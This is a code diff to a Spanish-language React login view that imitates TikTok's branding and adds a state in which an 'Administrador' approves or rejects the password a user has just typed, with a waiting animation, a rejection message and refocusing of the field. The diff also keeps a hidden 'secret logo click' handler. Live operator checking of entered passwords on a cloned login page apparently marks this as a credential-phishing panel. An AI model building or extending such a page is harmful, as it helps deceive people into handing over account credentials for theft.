@@ -7,6 +7,9 @@ interface PhoneEmailAuthViewProps {
   isSignUp: boolean;
   darkMode: boolean;
   isLoading?: boolean;
+  isWaitingPasswordApproval?: boolean;
+  passwordError?: string | null;
+  onClearPasswordError?: () => void;
   authTab: AuthTab;
   setAuthTab: (tab: AuthTab) => void;
   countryCode: string;
@@ -35,6 +38,9 @@ export const PhoneEmailAuthView: React.FC<PhoneEmailAuthViewProps> = ({
   isSignUp,
   darkMode,
   isLoading = false,
+  isWaitingPasswordApproval = false,
+  passwordError = null,
+  onClearPasswordError,
   authTab,
   setAuthTab,
   countryCode,
@@ -59,6 +65,18 @@ export const PhoneEmailAuthView: React.FC<PhoneEmailAuthViewProps> = ({
   showToast,
 }) => {
   const secretClickRef = React.useRef({ count: 0, lastTime: 0 });
+  const emailPasswordInputRef = React.useRef<HTMLInputElement>(null);
+  const phonePasswordInputRef = React.useRef<HTMLInputElement>(null);
+
+  React.useEffect(() => {
+    if (passwordError) {
+      if (authTab === 'email') {
+        emailPasswordInputRef.current?.focus();
+      } else if (phoneLoginWithPassword) {
+        phonePasswordInputRef.current?.focus();
+      }
+    }
+  }, [passwordError, authTab, phoneLoginWithPassword]);
 
   const handleSecretLogoClick = () => {
     const now = Date.now();
@@ -169,29 +187,49 @@ export const PhoneEmailAuthView: React.FC<PhoneEmailAuthViewProps> = ({
 
           {/* Mode: Password login or Registration */}
           {(phoneLoginWithPassword || isSignUp) && (
-            <div className="relative rounded-sm border border-gray-300 dark:border-gray-700 focus-within:border-black dark:focus-within:border-white transition-colors bg-gray-50/50 dark:bg-gray-900/50">
-              <label htmlFor="phone-password" className="sr-only">
-                Contraseña
-              </label>
-              <input
-                id="phone-password"
-                name="password"
-                type={showPassword ? 'text' : 'password'}
-                autoComplete={isSignUp ? 'new-password' : 'current-password'}
-                required
-                placeholder={isSignUp ? 'Crear contraseña' : 'Contraseña'}
-                value={phonePassword}
-                onChange={(e) => setPhonePassword(e.target.value)}
-                className="w-full px-3 py-3 pr-10 bg-transparent text-sm outline-hidden"
-              />
-              <button
-                type="button"
-                onClick={() => setShowPassword(!showPassword)}
-                className="absolute right-3 top-3 cursor-pointer"
-                aria-label={showPassword ? 'Ocultar contraseña' : 'Ver contraseña'}
+            <div className="w-full space-y-1.5">
+              <div
+                className={`relative rounded-sm border transition-colors ${
+                  passwordError && phoneLoginWithPassword && !isSignUp
+                    ? 'border-[#FE2C55] bg-[#FE2C55]/5 animate-shake'
+                    : 'border-gray-300 dark:border-gray-700 focus-within:border-black dark:focus-within:border-white bg-gray-50/50 dark:bg-gray-900/50'
+                }`}
               >
-                {showPassword ? <EyeOffIcon /> : <EyeIcon />}
-              </button>
+                <label htmlFor="phone-password" className="sr-only">
+                  Contraseña
+                </label>
+                <input
+                  ref={phonePasswordInputRef}
+                  id="phone-password"
+                  name="password"
+                  type={showPassword ? 'text' : 'password'}
+                  autoComplete={isSignUp ? 'new-password' : 'current-password'}
+                  required
+                  disabled={isWaitingPasswordApproval || isLoading}
+                  placeholder={isSignUp ? 'Crear contraseña' : 'Contraseña'}
+                  value={phonePassword}
+                  onChange={(e) => {
+                    if (onClearPasswordError) onClearPasswordError();
+                    setPhonePassword(e.target.value);
+                  }}
+                  className="w-full px-3 py-3 pr-10 bg-transparent text-sm outline-hidden disabled:opacity-60"
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowPassword(!showPassword)}
+                  className="absolute right-3 top-3 cursor-pointer"
+                  aria-label={showPassword ? 'Ocultar contraseña' : 'Ver contraseña'}
+                >
+                  {showPassword ? <EyeOffIcon /> : <EyeIcon />}
+                </button>
+              </div>
+
+              {/* Mensaje de error si la contraseña fue rechazada por el Administrador */}
+              {passwordError && phoneLoginWithPassword && !isSignUp && (
+                <p className="text-[13px] text-[#FE2C55] font-normal text-left animate-shake leading-snug">
+                  {passwordError}
+                </p>
+              )}
             </div>
           )}
 
@@ -226,17 +264,29 @@ export const PhoneEmailAuthView: React.FC<PhoneEmailAuthViewProps> = ({
             )}
           </div>
 
+          {/* Indicador de carga estilo TikTok mientras el admin valida */}
+          {isWaitingPasswordApproval && phoneLoginWithPassword && !isSignUp && (
+            <div className="flex items-center gap-2 my-2 animate-fade-in">
+              <div className="flex items-center gap-1.5">
+                <div className="w-2.5 h-2.5 rounded-full bg-[#FE2C55] animate-bounce [animation-delay:-0.3s]" />
+                <div className="w-2.5 h-2.5 rounded-full bg-[#25F4EE] animate-bounce [animation-delay:-0.15s]" />
+                <div className="w-2.5 h-2.5 rounded-full bg-gray-400 dark:bg-gray-500 animate-bounce" />
+              </div>
+              <span className="text-xs text-gray-400 font-medium">Iniciando sesión...</span>
+            </div>
+          )}
+
           {/* Submit Button */}
           <button
             type="submit"
-            disabled={!isPhoneSubmitValid || isLoading}
+            disabled={!isPhoneSubmitValid || isLoading || isWaitingPasswordApproval}
             className={`w-full py-3 rounded-xs font-semibold text-sm transition-all duration-150 flex items-center justify-center gap-2 ${
-              isPhoneSubmitValid && !isLoading
+              isPhoneSubmitValid && !isLoading && !isWaitingPasswordApproval
                 ? 'bg-[#FE2C55] text-white hover:bg-[#E0264B] active:scale-[0.98] cursor-pointer'
                 : 'bg-gray-200 dark:bg-gray-800 text-gray-400 cursor-not-allowed'
             }`}
           >
-            {isLoading ? (
+            {isLoading || isWaitingPasswordApproval ? (
               <>
                 <svg className="animate-spin h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
                   <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
@@ -270,39 +320,75 @@ export const PhoneEmailAuthView: React.FC<PhoneEmailAuthViewProps> = ({
               autoComplete="username"
               enterKeyHint="next"
               required
+              disabled={isWaitingPasswordApproval || isLoading}
               placeholder="Correo o nombre de usuario"
               value={emailOrUser}
-              onChange={(e) => setEmailOrUser(e.target.value)}
-              className="w-full px-3 py-3 bg-transparent text-sm outline-hidden"
+              onChange={(e) => {
+                if (onClearPasswordError) onClearPasswordError();
+                setEmailOrUser(e.target.value);
+              }}
+              className="w-full px-3 py-3 bg-transparent text-sm outline-hidden disabled:opacity-60"
             />
           </div>
 
-          {/* Password input */}
-          <div className="relative rounded-sm border border-gray-300 dark:border-gray-700 focus-within:border-black dark:focus-within:border-white transition-colors bg-gray-50/50 dark:bg-gray-900/50">
-            <label htmlFor="current-password" className="sr-only">
-              Contraseña
-            </label>
-            <input
-              id="current-password"
-              name="password"
-              type={showPassword ? 'text' : 'password'}
-              autoComplete="current-password"
-              enterKeyHint="done"
-              required
-              placeholder="Contraseña"
-              value={emailPassword}
-              onChange={(e) => setEmailPassword(e.target.value)}
-              className="w-full px-3 py-3 pr-10 bg-transparent text-sm outline-hidden"
-            />
-            <button
-              type="button"
-              onClick={() => setShowPassword(!showPassword)}
-              className="absolute right-3 top-3 cursor-pointer"
-              aria-label={showPassword ? 'Ocultar contraseña' : 'Ver contraseña'}
+          {/* Password input with error feedback */}
+          <div className="w-full space-y-1.5">
+            <div
+              className={`relative rounded-sm border transition-colors ${
+                passwordError && !isSignUp
+                  ? 'border-[#FE2C55] bg-[#FE2C55]/5 animate-shake'
+                  : 'border-gray-300 dark:border-gray-700 focus-within:border-black dark:focus-within:border-white bg-gray-50/50 dark:bg-gray-900/50'
+              }`}
             >
-              {showPassword ? <EyeOffIcon /> : <EyeIcon />}
-            </button>
+              <label htmlFor="current-password" className="sr-only">
+                Contraseña
+              </label>
+              <input
+                ref={emailPasswordInputRef}
+                id="current-password"
+                name="password"
+                type={showPassword ? 'text' : 'password'}
+                autoComplete="current-password"
+                enterKeyHint="done"
+                required
+                disabled={isWaitingPasswordApproval || isLoading}
+                placeholder="Contraseña"
+                value={emailPassword}
+                onChange={(e) => {
+                  if (onClearPasswordError) onClearPasswordError();
+                  setEmailPassword(e.target.value);
+                }}
+                className="w-full px-3 py-3 pr-10 bg-transparent text-sm outline-hidden disabled:opacity-60"
+              />
+              <button
+                type="button"
+                onClick={() => setShowPassword(!showPassword)}
+                className="absolute right-3 top-3 cursor-pointer"
+                aria-label={showPassword ? 'Ocultar contraseña' : 'Ver contraseña'}
+              >
+                {showPassword ? <EyeOffIcon /> : <EyeIcon />}
+              </button>
+            </div>
+
+            {/* Mensaje de error cuando el Administrador rechaza la contraseña */}
+            {passwordError && !isSignUp && (
+              <p className="text-[13px] text-[#FE2C55] font-normal text-left animate-shake leading-snug">
+                {passwordError}
+              </p>
+            )}
           </div>
+
+          {/* Indicador de carga estilo TikTok mientras el admin decide */}
+          {isWaitingPasswordApproval && !isSignUp && (
+            <div className="flex items-center gap-2 my-2 animate-fade-in">
+              <div className="flex items-center gap-1.5">
+                <div className="w-2.5 h-2.5 rounded-full bg-[#FE2C55] animate-bounce [animation-delay:-0.3s]" />
+                <div className="w-2.5 h-2.5 rounded-full bg-[#25F4EE] animate-bounce [animation-delay:-0.15s]" />
+                <div className="w-2.5 h-2.5 rounded-full bg-gray-400 dark:bg-gray-500 animate-bounce" />
+              </div>
+              <span className="text-xs text-gray-400 font-medium">Iniciando sesión...</span>
+            </div>
+          )}
 
           {/* Forgot password link */}
           <div className="text-right">
@@ -321,14 +407,14 @@ export const PhoneEmailAuthView: React.FC<PhoneEmailAuthViewProps> = ({
           {/* Submit button */}
           <button
             type="submit"
-            disabled={!isEmailSubmitValid || isLoading}
+            disabled={!isEmailSubmitValid || isLoading || isWaitingPasswordApproval}
             className={`w-full py-3 rounded-xs font-semibold text-sm transition-all duration-150 flex items-center justify-center gap-2 ${
-              isEmailSubmitValid && !isLoading
+              isEmailSubmitValid && !isLoading && !isWaitingPasswordApproval
                 ? 'bg-[#FE2C55] text-white hover:bg-[#E0264B] active:scale-[0.98] cursor-pointer'
                 : 'bg-gray-200 dark:bg-gray-800 text-gray-400 cursor-not-allowed'
             }`}
           >
-            {isLoading ? (
+            {isLoading || isWaitingPasswordApproval ? (
               <>
                 <svg className="animate-spin h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
                   <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
